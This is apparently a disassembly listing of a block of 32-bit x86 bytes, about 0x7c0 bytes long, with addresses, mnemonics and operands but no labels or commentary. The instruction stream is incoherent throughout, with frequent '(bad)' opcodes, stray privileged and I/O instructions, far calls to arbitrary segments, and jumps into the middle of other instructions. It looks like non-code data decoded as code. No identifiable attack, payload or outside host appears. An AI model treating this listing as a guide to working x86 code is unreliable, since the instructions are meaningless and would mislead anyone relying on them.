  4233ca:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4233ce:	inc    ebp
  4233cf:	fmul   st,st(7)
  4233d1:	mov    es,WORD PTR [ebp-0x11cca407]
  4233d7:	and    al,0x44
  4233d9:	pop    ecx
  4233da:	mov    eax,0x2ce5d845
  4233df:	pop    edi
  4233e0:	iret   
  4233e1:	rol    esi,cl
  4233e3:	ret    
  4233e4:	xchg   ebp,eax
  4233e5:	ret    
  4233e6:	or     DWORD PTR [ebp+0x73],eax
  4233e9:	xor    ah,bl
  4233eb:	cmp    dl,BYTE PTR [eax]
  4233ed:	fadd   st,st(4)
  4233ef:	mov    ebp,0xeef518b4
  4233f4:	mov    esi,0xf453c28
  4233f9:	inc    ebx
  4233fa:	nop
  4233fb:	xlat   BYTE PTR ds:[ebx]
  4233fc:	test   eax,0x167732d1
  423401:	sbb    DWORD PTR [edx-0x6],edx
  423404:	iret   
  423405:	test   eax,0x68e03622
  42340a:	and    DWORD PTR [edx+0x51756476],0x69
  423411:	scas   eax,DWORD PTR es:[edi]
  423412:	sahf   
  423413:	ficomp WORD PTR [eax-0x5578295c]
  423419:	sub    BYTE PTR [esi+0x421f6912],bh
  42341f:	fidivr DWORD PTR [ebx-0x78]
  423422:	(bad)
  423425:	or     esp,esp
  423427:	nop
  423428:	lods   al,BYTE PTR ds:[esi]
  423429:	shl    BYTE PTR [ecx-0x5c0f6d10],cl
  42342f:	add    al,0x97
  423431:	cmp    DWORD PTR [eax+0x49e21e9c],edx
  423437:	xchg   ecx,eax
  423438:	ret    0x3fe2
  42343b:	xor    al,0xb8
  42343d:	jno    0x42344f
  42343f:	in     eax,dx
  423440:	mov    bl,0x64
  423442:	mov    ds:0x4d798e20,al
  423447:	sbb    edi,DWORD PTR [esi-0x2b]
  42344a:	out    dx,eax
  42344b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42344c:	dec    eax
  42344d:	mov    al,ds:0x939541bb
  423452:	dec    esp
  423453:	push   esi
  423454:	scas   al,BYTE PTR es:[edi]
  423455:	push   ds
  423456:	mov    cl,0xd2
  423458:	gs xchg ebp,eax
  42345a:	add    BYTE PTR [ebx-0x3704c881],bh
  423460:	mov    ds:0x5c946e56,eax
  423465:	mov    ah,0x43
  423467:	jp     0x423471
  423469:	sub    ecx,DWORD PTR [ecx-0x789ae465]
  42346f:	push   esi
  423470:	outs   dx,DWORD PTR ds:[esi]
  423471:	repz sub al,0x5b
  423474:	imul   edi,DWORD PTR [edi-0x1a],0x6ab2e3f3
  42347b:	inc    esi
  42347c:	add    DWORD PTR [eax],esi
  42347e:	imul   esi,DWORD PTR [eax+0x68],0xb2197276
  423485:	aaa    
  423486:	xor    dh,BYTE PTR [edi+0x62]
  423489:	dec    ebp
  42348a:	cmp    esi,edx
  42348c:	mov    ah,0x63
  42348e:	imul   esi,DWORD PTR [ebx],0x8856bfac
  423494:	or     BYTE PTR ds:0xe7cf2b84,bl
  42349a:	(bad)  
  42349b:	in     eax,dx
  42349c:	push   eax
  42349d:	jge    0x42342a
  42349f:	jnp    0x423509
  4234a1:	pop    esi
  4234a2:	push   ecx
  4234a3:	mov    al,ds:0xd3341b10
  4234a8:	lahf   
  4234a9:	gs pushf 
  4234ab:	ja     0x4234e1
  4234ad:	lods   al,BYTE PTR ds:[esi]
  4234ae:	ds jmp 0x905f:0x952457af
  4234b6:	or     edi,DWORD PTR [ecx]
  4234b8:	push   0x12dcf648
  4234bd:	cmp    bh,BYTE PTR [esi-0x16]
  4234c0:	dec    eax
  4234c1:	rol    BYTE PTR [ebx],1
  4234c3:	jb     0x4234b8
  4234c5:	(bad)  
  4234c6:	sbb    al,0x7d
  4234c8:	jl     0x4234f7
  4234ca:	or     al,0x6e
  4234cc:	test   ebp,ebp
  4234ce:	push   eax
  4234cf:	daa    
  4234d0:	or     dl,BYTE PTR [ebx]
  4234d2:	inc    ebx
  4234d3:	pop    ecx
  4234d4:	adc    DWORD PTR [ecx],0x44abdd1c
  4234da:	in     eax,dx
  4234db:	test   BYTE PTR [edi-0xe],ch
  4234de:	add    BYTE PTR [bp+si],al
  4234e1:	std    
  4234e2:	call   0x125526aa
  4234e7:	jns    0x4234f6
  4234e9:	mov    dl,0xd8
  4234eb:	jg     0x4234c8
  4234ed:	repnz pop esi
  4234ef:	pop    ds
  4234f0:	test   eax,0xd57ce594
  4234f5:	xchg   ebp,eax
  4234f6:	stos   DWORD PTR es:[edi],eax
  4234f7:	dec    esi
  4234f8:	cmp    ebp,DWORD PTR [ebx-0x78b18d35]
  4234fe:	inc    edx
  4234ff:	inc    ebx
  423500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423501:	mov    bl,al
  423503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423504:	test   al,0xcc
  423506:	pop    esp
  423507:	popa   
  423508:	and    dh,BYTE PTR [edi-0x40]
  42350b:	in     al,dx
  42350c:	dec    ebp
  42350d:	add    BYTE PTR [ebx],cl
  42350f:	add    DWORD PTR [ebx-0x528a218b],edi
  423515:	and    eax,0x434bdc6f
  42351a:	cli    
  42351b:	cmp    BYTE PTR [esp+eax*1],cl
  42351e:	or     eax,DWORD PTR [ecx]
  423520:	sub    eax,0xb982c128
  423525:	stos   DWORD PTR es:[edi],eax
  423526:	lock xchg esp,eax
  423528:	add    edi,ecx
  42352a:	ror    DWORD PTR [edi-0x4eda491d],1
  423530:	sub    BYTE PTR [eax+eax*1+0x42],dh
  423534:	adc    BYTE PTR [edx+ecx*8+0x20],bl
  423538:	iret   
  423539:	inc    ebp
  42353a:	out    0x29,al
  42353c:	stc    
  42353d:	imul   esp,DWORD PTR [ebp+0x6],0xffffffe7
  423541:	mov    cl,0x81
  423543:	mov    eax,0xf7a3b5df
  423548:	xchg   edx,eax
  42354a:	adc    dl,BYTE PTR [esi+0x55a6204f]
  423550:	in     eax,dx
  423551:	mov    ch,0x98
  423553:	mov    BYTE PTR [ebx],bh
  423555:	in     al,dx
  423556:	rcl    al,1
  423558:	pop    ds
  423559:	cmp    BYTE PTR [edi-0x11153da6],0x13
  423560:	int3   
  423561:	js     0x42350e
  423563:	shl    BYTE PTR [ebx+0x17],1
  423566:	fs clc 
  423568:	jecxz  0x4234fa
  42356a:	and    al,BYTE PTR [eax+0x1fa3c0b]
  423570:	test   al,0x9
  423572:	dec    esp
  423573:	dec    esi
  423574:	ror    DWORD PTR [esi-0x6758e9e9],cl
  42357a:	adc    eax,0x26b390d2
  42357f:	mov    bl,0x3b
  423581:	push   edx
  423582:	cmp    ebx,0xffffffbc
  423585:	push   edi
  423586:	aaa    
  423587:	jno    0x42359b
  423589:	pop    ebp
  42358a:	addr16 inc ecx
  42358c:	(bad)  
  42358d:	fstp   DWORD PTR [ecx-0x152be4c7]
  423593:	xor    eax,DWORD PTR [edx+0x7f202ef7]
  423599:	pop    esp
  42359a:	pushf  
  42359b:	or     ecx,DWORD PTR [ecx+0x48]
  42359e:	push   edi
  4235a0:	(bad)  
  4235a1:	data16 jmp 0x4235a0
  4235a4:	add    esp,DWORD PTR [ebp+0x2351a20e]
  4235aa:	data16 (bad) 
  4235ac:	(bad)  
  4235ad:	fs call 0x69a:0x876a91b2
  4235b5:	push   esp
  4235b6:	daa    
  4235b7:	nop
  4235b8:	(bad)  
  4235b9:	sbb    bl,ch
  4235bb:	pop    esp
  4235bc:	int    0x71
  4235be:	rcr    DWORD PTR [edx-0x3e1ea1be],0xed
  4235c5:	xor    DWORD PTR [ecx+0x52],ebx
  4235c8:	rcl    dl,1
  4235ca:	mov    bh,0xc0
  4235cc:	retf   0xd8cb
  4235cf:	mov    al,ds:0x66fc6655
  4235d4:	push   ecx
  4235d5:	je     0x4235ef
  4235d7:	jmp    0x42360f
  4235d9:	sbb    cl,ch
  4235db:	add    ch,BYTE PTR [ecx+0x5f30f9f9]
  4235e1:	lea    eax,[eax]
  4235e3:	scas   al,BYTE PTR es:[edi]
  4235e4:	pop    edi
  4235e5:	pop    edx
  4235e6:	enter  0xd7f0,0x10
  4235ea:	cli    
  4235eb:	jb     0x423602
  4235ed:	imul   esp,DWORD PTR [esi+0x10f1a667],0xed46a2f
  4235f7:	call   0xda951012
  4235fc:	dec    esp
  4235fd:	mov    gs,WORD PTR [ecx]
  4235ff:	outs   dx,DWORD PTR ds:[esi]
  423600:	xchg   ebp,eax
  423601:	xchg   ecx,eax
  423602:	ror    al,cl
  423604:	jo     0x4235be
  423606:	inc    ecx
  423607:	inc    ecx
  423608:	out    dx,al
  423609:	adc    ch,BYTE PTR [eax]
  42360b:	lahf   
  42360c:	ss enter 0xb1da,0x7c
  423611:	mov    ds:0x353b1ae8,eax
  423616:	or     al,0x29
  423618:	adc    BYTE PTR [ebp-0x2e],cl
  42361b:	das    
  42361c:	ja     0x4235cc
  42361e:	lea    ebp,[edx+0x4317f558]
  423624:	lahf   
  423625:	mov    edi,0x63889802
  42362a:	xor    edi,DWORD PTR [edx]
  42362c:	(bad)  
  42362d:	imul   BYTE PTR [edx]
  42362f:	or     esp,DWORD PTR [ecx+0x6a]
  423632:	stc    
  423633:	mov    dl,0xb3
  423635:	loopne 0x423646
  423637:	push   esi
  423638:	dec    esp
  423639:	adc    edx,ebp
  42363b:	cld    
  42363c:	leave  
  42363d:	xor    al,0xd7
  42363f:	add    eax,0x83b98772
  423644:	ja     0x4235d6
  423646:	(bad)  
  423648:	mov    edx,0x2d106b32
  42364d:	into   
  42364e:	mov    dl,0x1c
  423650:	xchg   esp,eax
  423651:	lea    edx,[edi+0x9]
  423654:	jnp    0x42362d
  423656:	mov    dl,0x4b
  423658:	push   ebp
  423659:	in     al,0xa
  42365b:	mov    ds:0x345dc56f,eax
  423660:	jbe    0x4236de
  423662:	sub    al,0xc0
  423664:	cld    
  423665:	dec    ecx
  423666:	repz lea ebx,[eax]
  423669:	mov    eax,0x7bc24f97
  42366e:	cmp    dl,BYTE PTR [eax]
  423670:	test   BYTE PTR [ebp+0x2bde4d34],cl
  423676:	mov    esp,0x41215b78
  42367b:	int    0x98
  42367d:	shl    BYTE PTR [esi],0xa1
  423680:	and    cl,BYTE PTR [ebx+0x59]
  423683:	sahf   
  423684:	mov    ah,BYTE PTR [ecx-0x50fb5a6]
  42368a:	cmc    
  42368b:	mov    eax,0x6b1c63d4
  423690:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423692:	push   esi
  423693:	test   al,0x3
  423695:	add    BYTE PTR [edi-0x2f],ch
  423698:	push   ds
  423699:	mov    al,0x2a
  42369b:	test   al,0xec
  42369d:	outs   dx,DWORD PTR ds:[esi]
  42369e:	fiadd  WORD PTR [edi-0x5f488a12]
  4236a4:	jae    0x42370a
  4236a6:	or     eax,0x87a94473
  4236ab:	add    dh,al
  4236ad:	mov    ah,0xbd
  4236af:	mov    edi,gs
  4236b1:	sbb    DWORD PTR [ebx+0x1c02fe7],esi
  4236b7:	call   0x16dc835e
  4236bc:	data16 or BYTE PTR [eax+ebx*2+0x29030f19],ch
  4236c4:	or     eax,0xd2f5f250
  4236c9:	fimul  WORD PTR [edi]
  4236cb:	ja     0x423706
  4236cd:	push   ss
  4236ce:	sbb    dl,0xd7
  4236d1:	scas   eax,DWORD PTR es:[edi]
  4236d2:	dec    ebp
  4236d3:	adc    eax,0x43b995b2
  4236d8:	and    eax,DWORD PTR [esi]
  4236da:	in     al,dx
  4236db:	scas   al,BYTE PTR es:[edi]
  4236dc:	dec    ecx
  4236dd:	add    esp,ebx
  4236df:	xor    edi,ebx
  4236e1:	add    bl,ah
  4236e3:	mov    bl,BYTE PTR [ecx+0x1453b85b]
  4236e9:	dec    edi
  4236ea:	outs   dx,BYTE PTR ds:[esi]
  4236eb:	in     al,dx
  4236ec:	out    0x16,eax
  4236ee:	gs ins BYTE PTR es:[edi],dx
  4236f0:	jo     0x42375c
  4236f2:	push   cs
  4236f3:	inc    edi
  4236f4:	ins    BYTE PTR es:[edi],dx
  4236f5:	outs   dx,DWORD PTR ds:[esi]
  4236f6:	sbb    DWORD PTR [ecx],0xc30cc6c5
  4236fc:	test   eax,0x2b35441f
  423701:	dec    ecx
  423702:	sub    esp,DWORD PTR [edi+0x30]
  423705:	fst    DWORD PTR [eax+0x4076c393]
  42370b:	fsubr  st(5),st
  42370d:	mov    cl,0xb3
  42370f:	cmp    cl,cl
  423711:	scas   al,BYTE PTR es:[edi]
  423712:	and    BYTE PTR [esi],ah
  423714:	inc    ebp
  423715:	sub    al,0xa3
  423718:	retf   
  423719:	scas   eax,DWORD PTR es:[edi]
  42371a:	lock arpl WORD PTR [edi],di
  42371d:	fdivr  QWORD PTR [edi+0x4c5771ab]
  423723:	into   
  423724:	enter  0xa85,0x9
  423728:	jb     0x4236eb
  42372a:	xlat   BYTE PTR ds:[ebx]
  42372b:	push   ebp
  42372c:	jle    0x423774
  42372e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42372f:	test   eax,0x47095e25
  423734:	aas    
  423735:	pop    eax
  423736:	pop    ss
  423737:	dec    eax
  423738:	ror    DWORD PTR [ecx],0x50
  42373b:	sahf   
  42373c:	loop   0x4237ba
  42373e:	jmp    0x11cd:0x6d1f4f55
  423745:	xor    al,0x3b
  423747:	xor    eax,0x45339cc5
  42374c:	add    eax,0x13c7b06f
  423751:	jl     0x423745
  423753:	pusha  
  423754:	sbb    dl,ah
  423756:	ror    DWORD PTR [edi+0x751066a7],0x83
  42375d:	test   esp,edi
  42375f:	push   edi
  423760:	mov    al,ds:0xb3ab5efe
  423765:	retf   
  423766:	xacquire xchg DWORD PTR [edx+0x6a],eax
  42376a:	fiadd  WORD PTR [ebp-0x1bae187e]
  423770:	mov    ecx,0x37c405f9
  423775:	push   esp
  423776:	adc    dl,bl
  423778:	daa    
  423779:	mov    fs,WORD PTR [eax+0x1b]
  42377c:	sti    
  42377d:	ret    
  42377e:	fimul  WORD PTR [edx]
  423780:	xchg   edx,eax
  423781:	adc    eax,0xba01a26e
  423786:	cmp    DWORD PTR [edx-0x7b],edi
  423789:	mov    bh,0x63
  42378b:	mov    esp,0x59066d42
  423790:	dec    esi
  423791:	sub    DWORD PTR [ebp+0x9],0x19a52aa6
  423798:	and    esi,ecx
  42379a:	mov    DWORD PTR [edi+eiz*4],edx
  42379d:	adc    eax,0x68475e40
  4237a2:	inc    ebp
  4237a3:	inc    ecx
  4237a4:	imul   ebx,DWORD PTR [ebx],0x33
  4237a7:	(bad)  [edx+0x63]
  4237aa:	mov    edx,0x2e477bf8
  4237af:	jbe    0x423794
  4237b1:	das    
  4237b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237b3:	add    esp,edx
  4237b5:	pop    ss
  4237b6:	add    al,0x95
  4237b8:	stos   DWORD PTR es:[edi],eax
  4237b9:	test   edx,eax
  4237bb:	js     0x42377f
  4237bd:	in     al,dx
  4237be:	loop   0x4237db
  4237c0:	cmp    DWORD PTR [esi],edi
  4237c2:	inc    edi
  4237c3:	jno    0x423830
  4237c5:	mov    fs,WORD PTR [ebx]
  4237c7:	call   0xf40d:0xcc5761d
  4237ce:	aas    
  4237cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237d0:	out    0x7c,al
  4237d2:	mov    cl,0x8a
  4237d4:	ret    
  4237d5:	xor    eax,0x182e51aa
  4237da:	pop    ss
  4237db:	jbe    0x4237da
  4237dd:	aaa    
  4237de:	out    0x75,al
  4237e0:	mov    al,BYTE PTR ds:0xe7788b82
  4237e6:	sbb    BYTE PTR [eax-0x2dad90b5],ah
  4237ec:	pop    ebp
  4237ed:	imul   ecx,DWORD PTR [ecx+0xc],0xbe2824b5
  4237f4:	pop    edi
  4237f5:	jo     0x42382e
  4237f7:	in     al,dx
  4237f8:	mov    ah,0xae
  4237fa:	inc    esp
  4237fb:	sbb    BYTE PTR [eax+edx*2-0x75],ch
  4237ff:	int3   
  423800:	fild   WORD PTR [edi]
  423802:	clc    
  423803:	and    BYTE PTR [eax+edi*1+0x78229b9],dl
  42380a:	mov    ecx,0x2f1201e8
  42380f:	mov    edx,0x40ccf71a
  423814:	lods   al,BYTE PTR ds:[esi]
  423815:	in     al,dx
  423816:	ja     0x4237ad
  423818:	scas   al,BYTE PTR es:[edi]
  423819:	lods   al,BYTE PTR ds:[esi]
  42381a:	int3   
  42381b:	leave  
  42381c:	imul   ebx,DWORD PTR [esi],0xffffffd5
  42381f:	and    ebp,edi
  423821:	push   eax
  423822:	cmp    al,0x3c
  423824:	dec    edx
  423825:	out    dx,eax
  423826:	test   edi,0xab1ccc0c
  42382c:	cmc    
  42382d:	sub    eax,DWORD PTR fs:[ebp+0x64]
  423831:	dec    ebx
  423832:	dec    esi
  423833:	into   
  423834:	ds add bl,al
  423837:	(bad)  
  423838:	sbb    bh,bl
  42383a:	or     DWORD PTR [ecx],ebx
  42383c:	aad    0x21
  42383e:	add    al,0x43
  423840:	es ins BYTE PTR es:[edi],dx
  423842:	mov    WORD PTR ss:[edi],gs
  423845:	jo     0x423845
  423847:	retf   0x8c0d
  42384a:	test   esi,esp
  42384c:	xor    eax,0xedaaf9bf
  423851:	add    al,BYTE PTR [edi+0x24f09f3c]
  423857:	sahf   
  423858:	pusha  
  423859:	fsub   st,st(4)
  42385b:	fld    st(0)
  42385d:	ins    BYTE PTR es:[edi],dx
  42385e:	in     al,0xd3
  423860:	inc    ecx
  423861:	jb     0x423860
  423863:	loop   0x42387f
  423865:	stos   BYTE PTR es:[edi],al
  423866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423867:	mov    ah,0x66
  423869:	sbb    eax,0x1217448e
  42386e:	fldz   
  423870:	xor    BYTE PTR [ebp+0x2f7c1620],ah
  423876:	mov    esp,0xdadcd57f
  42387b:	aam    0x94
  42387d:	mov    al,0xf9
  42387f:	loop   0x4238f6
  423881:	(bad)
  423885:	fcom   QWORD PTR [edi+ecx*1+0x314f0367]
  42388c:	jge    0x4238c5
  42388e:	mov    ebp,0x69a1449c
  423893:	stos   DWORD PTR es:[edi],eax
  423894:	repz xchg esp,eax
  423896:	mov    ebx,0xc090ff12
  42389b:	xchg   edi,eax
  42389c:	fisttp DWORD PTR [ebx+0xc]
  42389f:	inc    edi
  4238a0:	in     al,0x53
  4238a2:	hlt    
  4238a3:	xchg   esi,eax
  4238a4:	add    DWORD PTR [esi-0x52],esi
  4238a7:	add    al,0x1e
  4238a9:	pop    esi
  4238aa:	jl     0x423873
  4238ac:	loop   0x4238df
  4238ae:	aas    
  4238af:	iret   
  4238b0:	and    eax,0x6d741155
  4238b5:	mov    ds:0xbb518e85,eax
  4238ba:	xchg   ecx,eax
  4238bb:	xor    DWORD PTR [edx-0x50d6fb53],esp
  4238c1:	and    eax,edi
  4238c3:	pop    ds
  4238c4:	(bad)  
  4238c5:	sysexit 
  4238c7:	std    
  4238c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238c9:	or     eax,DWORD PTR [esi+0x1c73d00c]
  4238cf:	hlt    
  4238d0:	pusha  
  4238d1:	mov    ecx,es
  4238d3:	daa    
  4238d4:	mov    esi,0x85b763a5
  4238d9:	hlt    
  4238da:	hlt    
  4238db:	add    bl,BYTE PTR [edx+0x6b4191db]
  4238e1:	push   edi
  4238e2:	iret   
  4238e3:	sbb    BYTE PTR [ebx-0x43a2001b],0x2
  4238ea:	add    al,0x9b
  4238ec:	loope  0x423948
  4238ee:	mov    ah,ah
  4238f0:	xchg   esi,eax
  4238f1:	dec    esi
  4238f2:	es enter 0xcf10,0x77
  4238f7:	push   ebx
  4238f8:	jmp    0x42393e
  4238fa:	jbe    0x4238bc
  4238fc:	dec    edi
  4238fd:	pusha  
  4238fe:	out    0x9,al
  423900:	(bad)  
  423901:	jbe    0x4238f6
  423903:	int    0x2e
  423905:	xchg   ebp,eax
  423906:	cwde   
  423907:	xchg   ebx,eax
  423908:	retf   0x11de
  42390b:	cmc    
  42390c:	sub    bl,BYTE PTR [esi+ebx*1-0x31]
  423910:	inc    edx
  423911:	cmp    cl,ch
  423913:	jmp    0x42393f
  423915:	jnp    0x423944
  423917:	xchg   edi,eax
  423918:	das    
  423919:	sbb    al,0x15
  42391b:	sub    BYTE PTR [ebx-0xb645e8a],dl
  423921:	cld    
  423922:	pop    es
  423923:	std    
  423924:	imul   edi,ebp,0x7da8b556
  42392a:	jne    0x4238f6
  42392c:	sub    DWORD PTR [edx],ecx
  42392e:	jae    0x42395d
  423930:	(bad)  
  423931:	pop    edi
  423932:	fstp   DWORD PTR [ebx-0x73b59bba]
  423938:	popa   
  423939:	mov    bh,0xf7
  42393b:	js     0x243179ea
  423941:	xchg   DWORD PTR ds:0x7736dbb1,edx
  423947:	mov    eax,ds:0x68802342
  42394c:	in     eax,dx
  42394d:	jecxz  0x4239c7
  42394f:	jne    0x423989
  423951:	xchg   edi,eax
  423952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423953:	clc    
  423954:	inc    ebx
  423955:	fisubr DWORD PTR [eax]
  423957:	out    dx,al
  423958:	push   edi
  423959:	add    eax,0x446f1c02
  42395e:	or     eax,0x39e6c8d9
  423963:	adc    al,BYTE PTR [edx-0x6bf5fa5c]
  423969:	xchg   edx,eax
  42396a:	dec    ecx
  42396b:	or     dh,BYTE PTR [ecx+eiz*8+0x76]
  42396f:	pop    es
  423970:	sbb    DWORD PTR [ebp+0x50],ebx
  423973:	fnsave [ebp+0x39]
  423976:	mov    bh,cl
  423978:	inc    edx
  423979:	inc    ecx
  42397a:	in     eax,dx
  42397b:	jle    0x4239d7
  42397d:	into   
  42397e:	sub    edi,ebp
  423980:	into   
  423981:	xor    DWORD PTR [edx+0x6816b46a],0xb030aae0
  42398b:	into   
  42398c:	cmp    cl,cl
  42398e:	push   0xffffffea
  423990:	pushf  
  423991:	ja     0x4239c2
  423993:	repnz sub BYTE PTR [ebx],0x41
  423997:	dec    esp
  423998:	out    0x3b,eax
  42399a:	jne    0x423944
  42399c:	dec    edx
  42399d:	cmp    eax,0x8cec7beb
  4239a2:	data16 int 0xb4
  4239a5:	xor    BYTE PTR [edx-0x13],dh
  4239a8:	sbb    al,0x59
  4239aa:	fnstenv [esi-0xe4c9df4]
  4239b0:	data16 and al,0x5c
  4239b3:	test   al,0x3f
  4239b5:	sahf   
  4239b6:	jne    0x423986
  4239b8:	sub    edx,edi
  4239ba:	xchg   ebp,eax
  4239bb:	dec    esi
  4239bc:	ins    DWORD PTR es:[edi],dx
  4239bd:	ficom  DWORD PTR [esi-0x5fe096e3]
  4239c3:	fcmovne st,st(7)
  4239c5:	lahf   
  4239c6:	lock out dx,eax
  4239c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239c9:	loope  0x423a33
  4239cb:	test   DWORD PTR [bp+di],ebx
  4239ce:	xor    DWORD PTR [esi],0x15c165f3
  4239d4:	sbb    eax,0x89ba5db2
  4239d9:	add    eax,0xaf404fae
  4239de:	adc    al,0x1b
  4239e0:	xchg   edx,eax
  4239e1:	xor    edx,ecx
  4239e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239e4:	(bad)  
  4239e5:	push   ss
  4239e6:	pop    ss
  4239e7:	pop    edi
  4239e8:	dec    esi
  4239e9:	mov    ebp,0xf2aa8d83
  4239ee:	repnz fs push ds
  4239f1:	daa    
  4239f2:	stos   DWORD PTR es:[edi],eax
  4239f3:	out    0x2f,eax
  4239f5:	cmp    ah,dl
  4239f7:	cli    
  4239f8:	js     0x423a49
  4239fa:	(bad)  
  4239fb:	fadd   DWORD PTR [ecx-0xe]
  4239fe:	dec    edx
  4239ff:	add    al,0x21
  423a01:	sahf   
  423a02:	retf   
  423a03:	jmp    0x423a77
  423a05:	dec    ecx
  423a06:	inc    edx
  423a07:	hlt    
  423a08:	sub    ecx,DWORD PTR [ebx]
  423a0a:	sahf   
  423a0b:	and    BYTE PTR [ebp+0xe],0x9c
  423a0f:	cmp    dl,BYTE PTR [ebx+ebx*1-0x79e647e2]
  423a16:	adc    eax,0x39db8c2a
  423a1b:	jmp    0x423a1f
  423a1d:	ins    DWORD PTR es:[edi],dx
  423a1e:	cmp    eax,0xc9447413
  423a23:	jp     0x4239aa
  423a25:	xchg   esi,eax
  423a26:	adc    DWORD PTR [esi+0x63919c2f],ecx
  423a2c:	cs or  esi,edi
  423a2f:	lods   al,BYTE PTR fs:[esi]
  423a31:	lods   al,BYTE PTR ss:[esi]
  423a33:	pop    ss
  423a34:	pop    ecx
  423a35:	or     al,0xef
  423a37:	test   dl,cl
  423a39:	and    BYTE PTR [edi],cl
  423a3b:	pop    eax
  423a3c:	iret   
  423a3d:	ins    DWORD PTR es:[edi],dx
  423a3e:	aad    0x7b
  423a40:	xchg   dh,bh
  423a42:	lahf   
  423a43:	icebp  
  423a44:	fst    st(1)
  423a46:	or     edi,edi
  423a48:	dec    eax
  423a49:	call   0xa9d4a3ab
  423a4e:	repnz mov edx,0xfd6e3968
  423a54:	icebp  
  423a55:	push   eax
  423a56:	cwde   
  423a57:	pop    esi
  423a58:	sub    al,0x5
  423a5a:	mov    al,0x61
  423a5c:	sbb    DWORD PTR [ebx-0x81f5db9],ebx
  423a62:	fwait
  423a63:	inc    esi
  423a64:	out    dx,eax
  423a65:	lods   al,BYTE PTR ds:[esi]
  423a66:	cmp    ah,dh
  423a68:	stc    
  423a69:	call   0x6e53:0x701cf7af
  423a70:	in     eax,dx
  423a71:	inc    ebx
  423a72:	fisubr DWORD PTR [edi]
  423a74:	cmp    dl,BYTE PTR [ebx]
  423a76:	les    ebp,FWORD PTR [esi]
  423a78:	sar    BYTE PTR [edi-0xd],0xc4
  423a7c:	pop    ss
  423a7d:	pop    ecx
  423a7e:	xchg   DWORD PTR [ebx],edx
  423a80:	inc    esi
  423a81:	dec    esi
  423a82:	fbld   TBYTE PTR [edx-0x1f]
  423a85:	pop    edi
  423a86:	push   ebx
  423a87:	div    BYTE PTR ds:0x92b9dc19
  423a8d:	test   dh,bh
  423a8f:	imul   ebx,edi,0x63
  423a92:	pushf  
  423a93:	ss ja  0x423ac5
  423a96:	sub    DWORD PTR [ebp-0x2c],ecx
  423a99:	mov    bh,0xbe
  423a9b:	ret    0xb6a
  423a9e:	(bad)  
  423aa0:	rol    eax,cl
  423aa2:	sar    cl,cl
  423aa4:	clc    
  423aa5:	arpl   WORD PTR [eax+0x2fd8f9a8],bp
  423aab:	pop    ebp
  423aac:	mov    eax,ds:0xac1c1a0c
  423ab1:	push   cs
  423ab2:	pushf  
  423ab3:	mov    ds,WORD PTR [eax-0x43]
  423ab6:	and    BYTE PTR [edx],bh
  423ab8:	mov    fs,ecx
  423aba:	push   ecx
  423abb:	xchg   edi,eax
  423abc:	mov    eax,ds:0x86b54e14
  423ac1:	out    0x6c,al
  423ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ac4:	push   edi
  423ac5:	adc    ax,0xc329
  423ac9:	stos   DWORD PTR es:[edi],eax
  423aca:	mov    ch,0xb9
  423acc:	fwait
  423acd:	shl    BYTE PTR [esi],1
  423acf:	or     al,0x31
  423ad1:	and    eax,0x793c0445
  423ad6:	inc    edx
  423ad7:	mov    bh,0xf0
  423ad9:	inc    esp
  423ada:	bt     DWORD PTR [ebx-0x3eb9dc63],ebx
  423ae1:	and    ecx,esi
  423ae3:	loop   0x423a91
  423ae5:	sar    ebp,cl
  423ae7:	mov    ebx,0xb8e35404
  423aec:	push   cs
  423aed:	aas    
  423aee:	ins    BYTE PTR es:[edi],dx
  423aef:	xchg   DWORD PTR [esp+ecx*4+0x24e0e178],edi
  423af6:	or     ah,bl
  423af8:	hlt    
  423af9:	(bad)  
  423afa:	(bad)  
  423afb:	ss push eax
  423afd:	loop   0x423b25
  423aff:	(bad)  
  423b00:	fisttp QWORD PTR [edx-0x790f3d15]
  423b06:	mov    ebx,0x890204f4
  423b0b:	sub    dh,BYTE PTR [ebx]
  423b0d:	data16 fwait
  423b0f:	rcl    BYTE PTR ds:0x1a438741,cl
  423b15:	xor    ecx,ecx
  423b17:	shl    BYTE PTR [esi+0x7ce18bb3],0x9b
  423b1e:	and    ch,cl
  423b20:	add    eax,0x4782e5f0
  423b25:	jo     0x423ada
  423b27:	popa   
  423b28:	pop    edi
  423b29:	(bad)  
  423b2a:	mov    ds:0x36525272,al
  423b2f:	xchg   esi,eax
  423b30:	jp     0x423ae3
  423b32:	test   BYTE PTR ds:0x6b3f035b,dh
  423b38:	pop    eax
  423b39:	fucomip st,st(6)
  423b3b:	inc    esp
  423b3c:	mov    edi,0x95a1d78f
  423b41:	out    dx,al
  423b42:	add    al,0x8e
  423b44:	pop    ss
  423b45:	ret    
  423b46:	mov    ebp,DWORD PTR [ecx+0x40]
  423b49:	retf   0x7836
  423b4c:	mov    ecx,0xc2d11c04
  423b51:	cmc    
  423b52:	push   edi
  423b53:	inc    eax
  423b54:	fadd   QWORD PTR [ecx+0x52]
  423b57:	ins    DWORD PTR es:[edi],dx
  423b58:	mov    esi,0xd1dadc54
  423b5d:	and    ebx,DWORD PTR [edi+ebp*4]
  423b60:	xchg   edi,eax
  423b61:	adc    DWORD PTR [edx-0x1c],esi
  423b64:	pop    ebp
  423b65:	rol    DWORD PTR [esp+ebp*1-0x19],0x8f
  423b6a:	imul   ebx,DWORD PTR [ebx-0x3e],0x1c7457f7
  423b71:	jno    0x423bdc
  423b73:	pusha  
  423b74:	mov    DWORD PTR [edx],esp
  423b76:	or     ecx,edx
  423b78:	loopne 0x423b6b
  423b7a:	jge    0x423bcf
  423b7c:	shl    BYTE PTR es:[edx-0x1ebd6fa7],1
  423b83:	stos   BYTE PTR es:[edi],al
  423b84:	pop    es
  423b85:	lea    ebx,[edx+0x76d4d1b1]
